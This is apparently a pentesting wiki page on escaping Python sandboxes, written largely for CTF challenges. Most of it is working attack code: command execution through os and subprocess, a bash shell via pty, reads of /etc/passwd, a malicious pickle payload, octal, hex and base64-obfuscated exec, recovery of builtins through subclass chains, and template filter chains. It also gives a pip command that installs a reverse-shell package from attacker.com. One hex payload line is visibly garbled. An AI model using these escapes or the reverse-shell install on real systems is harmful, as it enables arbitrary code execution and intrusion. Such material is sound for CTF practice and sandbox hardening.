# Bypass Python sandboxes

These are some tricks to bypass python sandbox protections and execute arbitrary commands.

## Command Execution Libraries

The first thing you need to know is if you can directly execute code with some already imported library, or if you could import any of these libraries:

```python
os.system("ls")
os.popen("ls").read()
commands.getstatusoutput("ls") 
commands.getoutput("ls")
commands.getstatus("file/path")
subprocess.call("ls", shell=True)
subprocess.Popen("ls", shell=True)
pty.spawn("ls")
pty.spawn("/bin/bash")
platform.os.system("ls")

#Other interesting functions
open("/etc/passwd").read()
open('/var/www/html/input', 'w').write('123')
```

Remember that the _**open**_ and _**read**_ functions can be useful to **read files** inside the python sandbox and to **write some code** that you could **execute** to **bypass** the sandbox.  
Python2 **input\(\)** function allows to execute python code before the program crashes.

### Importing

```python
import os
from os import *
__import__('os').system("ls")
```

If **`sys`**module is present, you can use it to access **`os`**library for example:

```python
sys.modules["os"].system("ls")
```

You can also import libraries and any file is using **`execfile()`** \(python2\):

```python
execfile('/usr/lib/python2.7/os.py')
system('ls')
```

Python try to **load libraries from the current directory first**: `python3 -c 'import sys; print(sys.path)'`

## Bypass pickle sandbox with default installed python packages

### Default packages

You can find a **list of pre-installed** packages here: [https://docs.qubole.com/en/latest/user-guide/package-management/pkgmgmt-preinstalled-packages.html](https://docs.qubole.com/en/latest/user-guide/package-management/pkgmgmt-preinstalled-packages.html)  
Note that from a pickle you can make the python env **import arbitrary libraries** installed in the system.  
For example the following pickle, when loaded, is going to import the pip library to use it:

```python
#Note that here we are importing the pip library so the pickle is created correctly
#however, the victimdoesn't even need to have the library installed to execute it
#the library is going to be loaded automatically

import pickle, os, base64, pip
class P(object):
    def __reduce__(self):
        return (pip.main,(["list"],))

print(base64.b64encode(pickle.dumps(P(), protocol=0)))
```

For more information about how does pickle works check this: [https://checkoway.net/musings/pickle/](https://checkoway.net/musings/pickle/)

### Pip package

If you have access to `pip` or to `pip.main()` you can install an arbitrary package and obtain a reverse shell calling:

```bash
pip install http://attacker.com/Rerverse.tar.gz
pip.main(["install", "http://attacker.com/Rerverse.tar.gz"])
```

You can download the package to create the reverse shell here. Please, note that before using it you should **decompress it, change the `setup.py`, and put your IP for the reverse shell**:

{% file src="../../.gitbook/assets/reverse.tar.gz" %}

{% hint style="info" %}
This package is called `Reverse`.However, it was specially crafted so when you exit the reverse shell the rest of the installation will fail, so you **won't leave any extra python package installed on the server** when you leave.
{% endhint %}

## Executing python code

This is really interesting if some characters are forbidden because you can use the **hex/octal/B64** representation to **bypass** the restriction:

```python
exec("print('RCE'); __import__('os').system('ls')") #Using ";"
exec("print('RCE')\n__import__('os').system('ls')") #Using "\n"
eval("__import__('os').system('ls')") #Eval doesn't allow ";"
eval(compile('print("hello world"); print("heyy")', '<stdin>', 'exec')) #This way eval accept ";"
__import__('timeit').timeit("__import__('os').system('ls')",number=1)
#One liners that allow new lines and tabs
eval(compile('def myFunc():\n\ta="hello word"\n\tprint(a)\nmyFunc()', '<stdin>', 'exec'))
exec(compile('def myFunc():\n\ta="hello word"\n\tprint(a)\nmyFunc()', '<stdin>', 'exec'))
```

```python
#Octal
exec("\137\137\151\155\160\157\162\164\137\137\50\47\157\163\47\51\56\163\171\163\164\145\155\50\47\154\163\47\51")
#Hex
exec("\x5f\x5f\x69\x6d\xIf youca70\x6f\x72\x74\x5f\x5f\x28\x27\x6f\x73\x27\x29\x2e\x73\x79\x73\x74\x65\x6d\x28\x27\x6c\x73\x27\x29")
#Base64
exec('X19pbXBvcnRfXygnb3MnKS5zeXN0ZW0oJ2xzJyk='.decode("base64")) #Only python2
exec(__import__('base64').b64decode('X19pbXBvcnRfXygnb3MnKS5zeXN0ZW0oJ2xzJyk='))
```

### Compiling

In a previous example you can see how to execute any python code using the `compile` function. This is really interesting because you can execute whole scripts with loops and everything in a one liner \(and we could do the same using `exec`\).  
Anyway, sometimes it could be useful to **create** a **compiled object** in a local machine and execute it in the **CTF** \(for example because we don't have the `compile` function in the CTF\).

For example, let's compile and execute manually a function that reads _./poc.py_:

```python
#Locally
def read():
    return open("./poc.py",'r').read()

read.__code__.co_code
't\x00\x00d\x01\x00d\x02\x00\x83\x02\x00j\x01\x00\x83\x00\x00S'
```

```python
#On Remote
function_type = type(lambda: None)
code_type = type((lambda: None).__code__) #Get <type 'type'>
consts = (None, "./poc.py", 'r')
bytecode = 't\x00\x00d\x01\x00d\x02\x00\x83\x02\x00j\x01\x00\x83\x00\x00S'
names = ('open','read')

# And execute it using eval/exec
eval(code_type(0, 0, 3, 64, bytecode, consts, names, (), 'noname', '<module>', 1, '', (), ()))

#You could also execut it directly
import __builtin__
mydict = {}
mydict['__builtins__'] = __builtin__
codeobj = code_type(0, 0, 3, 64, bytecode, consts, names, (), 'noname', '<module>', 1, '', (), ())
function_type(codeobj, mydict, None, None, None)()
```

If you cannot access `eval` or `exec` you could create a **proper function**, but calling it directly is usually going to fail with: _constructor not accessible in restricted mode_. So you need a **function not in the restricted environment call this function.**

```python
#Compile a regular print
ftype = type(lambda: None)
ctype = type((lambda: None).func_code)
f = ftype(ctype(1, 1, 1, 67, '|\x00\x00GHd\x00\x00S', (None,), (), ('s',), 'stdin', 'f', 1, ''), {})
f(42)
```

## Builtins

[Builtins functions of python2    
](https://docs.python.org/2/library/functions.html)[Builtins functions of python3](https://docs.python.org/3/library/functions.html)

If you can access to the**`__builtins__`** object you can import libraries \(notice that you could also use here other string representation showed in last section\):

```python
__builtins__.__dict__['__import__']("os").system("ls")
```

### No Builtins

When you don't have \_\_builtins\_\_ you are not going to be able to import anything nor even read or write files. But there is a way to take that functionality back:

**Python2**

```python
#Try to reload __builtins__
reload(__builtins__)
import __builtin__

# Read recovering <type 'file'> in offset 40
().__class__.__bases__[0].__subclasses__()[40]('/etc/passwd').read()
# Write recovering <type 'file'> in offset 40
().__class__.__bases__[0].__subclasses__()[40]('/var/www/html/input', 'w').write('123')

# Execute recovering __import__ (class 59s is <class 'warnings.catch_warnings'>)
().__class__.__bases__[0].__subclasses__()[59]()._module.__builtins__['__import__']('os').system('ls')
# Execute (another method)
().__class__.__bases__[0].__subclasses__()[59].__init__.__getattribute__("func_globals")['linecache'].__dict__['os'].__dict__['system']('ls')
# Execute recovering eval symbol (class 59 is <class 'warnings.catch_warnings'>)
().__class__.__bases__[0].__subclasses__()[59].__init__.func_globals.values()[13]["eval"]("__import__('os').system('ls')")

# Or you could obtain the builtins from a defined function
get_flag.__globals__['__builtins__']['__import__']("os").system("ls")
```

#### Python3

```python
# Obtain the builtins from a defined function
get_flag.__globals__['__builtins__'].__import__("os").system("ls")

# The os._wrap_close class is usually loaded. Its scope gives direct access to os package (as well as __builtins__)
[ x.__init__.__globals__ for x in ''.__class__.__base__.__subclasses__() if x.__name__ == '_wrap_close' ][0]['system']('ls')

#If attr is present
(''|attr('___class__')|attr('__mro__')|attr('__getitem__')(1)|attr('__subclasses__')()|attr('__getitem__')(132)|attr('__init__')|attr('__globals__')|attr('__getitem__')('popen'))('cat+flag.txt').read()
(''|attr('\x5f\x5fclass\x5f\x5f')|attr('\x5f\x5fmro\x5f\x5f')|attr('\x5f\x5fgetitem\x5f\x5f')(1)|attr('\x5f\x5fsubclasses\x5f\x5f')()|attr('\x5f\x5fgetitem\x5f\x5f')(132)|attr('\x5f\x5finit\x5f\x5f')|attr('\x5f\x5fglobals\x5f\x5f')|attr('\x5f\x5fgetitem\x5f\x5f')('popen'))('cat+flag.txt').read()
```

#### Python2 and Python3

```python
# Recover __builtins__ and make eveything easier
__builtins__=([x for x in (1).__class__.__base__.__subclasses__() if x.__name__ == 'catch_warnings'][0]()._module.__builtins__)
__builtins__["__import__"]('os').system('ls')
```

### Finding types

```python
''.__class__     #<type 'str'>
str.__class__    #<type 'type'>
str.__class__('') #<type 'str'>
().__class__.__base__.__subclasses__()    #Several types
().__class__.__bases__[0].__subclasses__()#Several types
```

## Dissecting functions

In some CTFs you could be provided the name of a custom function where the flag resides and you need to see the internals of the function to extract it.

This is the function to inspect:

```python
def get_flag(some_input):
    var1=1
    var2="secretcode"
    var3=["some","array"]
    if some_input == var2:
        return "THIS-IS-THE-FALG!"
    else:
        return "Nope"
```

#### dir

```python
dir() #General dir() to find what we have loaded
['__builtins__', '__doc__', '__name__', '__package__', 'b', 'bytecode', 'code', 'codeobj', 'consts', 'dis', 'filename', 'foo', 'get_flag', 'names', 'read', 'x']
dir(get_flag) #Get info tof the function
['__call__', '__class__', '__closure__', '__code__', '__defaults__', '__delattr__', '__dict__', '__doc__', '__format__', '__get__', '__getattribute__', '__globals__', '__hash__', '__init__', '__module__', '__name__', '__new__', '__reduce__', '__reduce_ex__', '__repr__', '__setattr__', '__sizeof__', '__str__', '__subclasshook__', 'func_closure', 'func_code', 'func_defaults', 'func_dict', 'func_doc', 'func_globals', 'func_name']
```

#### globals

`__globals__` and `func_globals`\(Same\) Obtains the global environment. In the example you can see some imported modules, some global variables and their content declared:

```python
get_flag.func_globals
get_flag.__globals__
{'b': 3, 'names': ('open', 'read'), '__builtins__': <module '__builtin__' (built-in)>, 'codeobj': <code object <module> at 0x7f58c00b26b0, file "noname", line 1>, 'get_flag': <function get_flag at 0x7f58c00b27d0>, 'filename': './poc.py', '__package__': None, 'read': <function read at 0x7f58c00b23d0>, 'code': <type 'code'>, 'bytecode': 't\x00\x00d\x01\x00d\x02\x00\x83\x02\x00j\x01\x00\x83\x00\x00S', 'consts': (None, './poc.py', 'r'), 'x': <unbound method catch_warnings.__init__>, '__name__': '__main__', 'foo': <function foo at 0x7f58c020eb50>, '__doc__': None, 'dis': <module 'dis' from '/usr/lib/python2.7/dis.pyc'>}

#If you have access to some variable value
CustomClassObject.__class__.__init__.__globals__
```

`__code__` and `func_code`: You can access this to obtain some internal data of the function

```python
#Get the options
dir(get_flag.func_code)
['__class__', '__cmp__', '__delattr__', '__doc__', '__eq__', '__format__', '__ge__', '__getattribute__', '__gt__', '__hash__', '__init__', '__le__', '__lt__', '__ne__', '__new__', '__reduce__', '__reduce_ex__', '__repr__', '__setattr__', '__sizeof__', '__str__', '__subclasshook__', 'co_argcount', 'co_cellvars', 'co_code', 'co_consts', 'co_filename', 'co_firstlineno', 'co_flags', 'co_freevars', 'co_lnotab', 'co_name', 'co_names', 'co_nlocals', 'co_stacksize', 'co_varnames']
#Get internal varnames
get_flag.func_code.co_varnames
('some_input', 'var1', 'var2', 'var3')
#Get the value of the vars
get_flag.func_code.co_consts
(None, 1, 'secretcode', 'some', 'array', 'THIS-IS-THE-FALG!', 'Nope')
#Get bytecode
get_flag.func_code.co_code
'd\x01\x00}\x01\x00d\x02\x00}\x02\x00d\x03\x00d\x04\x00g\x02\x00}\x03\x00|\x00\x00|\x02\x00k\x02\x00r(\x00d\x05\x00Sd\x06\x00Sd\x00\x00S'
```

**Disassembly a function**

```python
import dis
dis.dis(get_flag)
  2           0 LOAD_CONST               1 (1)
              3 STORE_FAST               1 (var1)

  3           6 LOAD_CONST               2 ('secretcode')
              9 STORE_FAST               2 (var2)

  4          12 LOAD_CONST               3 ('some')
             15 LOAD_CONST               4 ('array')
             18 BUILD_LIST               2
             21 STORE_FAST               3 (var3)

  5          24 LOAD_FAST                0 (some_input)
             27 LOAD_FAST                2 (var2)
             30 COMPARE_OP               2 (==)
             33 POP_JUMP_IF_FALSE       40

  6          36 LOAD_CONST               5 ('THIS-IS-THE-FALG!')
             39 RETURN_VALUE        

  8     >>   40 LOAD_CONST               6 ('Nope')
             43 RETURN_VALUE        
             44 LOAD_CONST               0 (None)
             47 RETURN_VALUE
```

Notice that **if you cannot import `dis` in the python sandbox** you can obtain the **bytecode** of the function \(`get_flag.func_code.co_code`\) and **disassemble** it locally. You won't see the content of the variables being loaded \(`LOAD_CONST`\) but you can guess them from \(`get_flag.func_code.co_consts`\) because `LOAD_CONST`also tells the offset of the variable being loaded.

```python
dis.dis('d\x01\x00}\x01\x00d\x02\x00}\x02\x00d\x03\x00d\x04\x00g\x02\x00}\x03\x00|\x00\x00|\x02\x00k\x02\x00r(\x00d\x05\x00Sd\x06\x00Sd\x00\x00S')
          0 LOAD_CONST          1 (1)
          3 STORE_FAST          1 (1)
          6 LOAD_CONST          2 (2)
          9 STORE_FAST          2 (2)
         12 LOAD_CONST          3 (3)
         15 LOAD_CONST          4 (4)
         18 BUILD_LIST          2
         21 STORE_FAST          3 (3)
         24 LOAD_FAST           0 (0)
         27 LOAD_FAST           2 (2)
         30 COMPARE_OP          2 (==)
         33 POP_JUMP_IF_FALSE    40
         36 LOAD_CONST          5 (5)
         39 RETURN_VALUE   
    >>   40 LOAD_CONST          6 (6)
         43 RETURN_VALUE   
         44 LOAD_CONST          0 (0)
         47 RETURN_VALUE
```

## References

* [https://lbarman.ch/blog/pyjail/](https://lbarman.ch/blog/pyjail/)
* [https://ctf-wiki.github.io/ctf-wiki/pwn/linux/sandbox/python-sandbox-escape/](https://ctf-wiki.github.io/ctf-wiki/pwn/linux/sandbox/python-sandbox-escape/)
* [https://blog.delroth.net/2013/03/escaping-a-python-sandbox-ndh-2013-quals-writeup/](https://blog.delroth.net/2013/03/escaping-a-python-sandbox-ndh-2013-quals-writeup/)
* [https://gynvael.coldwind.pl/n/python\_sandbox\_escape](https://gynvael.coldwind.pl/n/python_sandbox_escape)
* [https://nedbatchelder.com/blog/201206/eval\_really\_is\_dangerous.html](https://nedbatchelder.com/blog/201206/eval_really_is_dangerous.html)

\*\*\*\*

